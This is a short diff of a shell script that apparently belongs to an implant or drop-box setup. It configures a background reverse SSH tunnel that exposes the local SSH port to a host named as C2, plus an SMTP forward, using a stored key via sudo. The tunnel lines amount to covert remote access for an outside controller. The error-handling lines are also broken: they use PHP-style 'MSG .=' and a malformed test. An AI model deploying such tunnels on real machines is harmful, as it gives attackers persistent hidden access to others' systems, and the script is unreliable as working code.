@@ -11,12 +11,12 @@
 source config.sh
 
 # Setup our SSH Tunnel
-sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f
+sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f
 if [ $? == 1 ]; then 
 		MSG .= "Failed to establish SSH  Tunnel"
 	fi
 
-	$SSH -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -N -f -C
+	sudo -u $C2USER ssh -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f
 	if [ -z $? = 1 ]; then
 			MSG .= "Failed to establish SMTP Tunnel"
 		fi
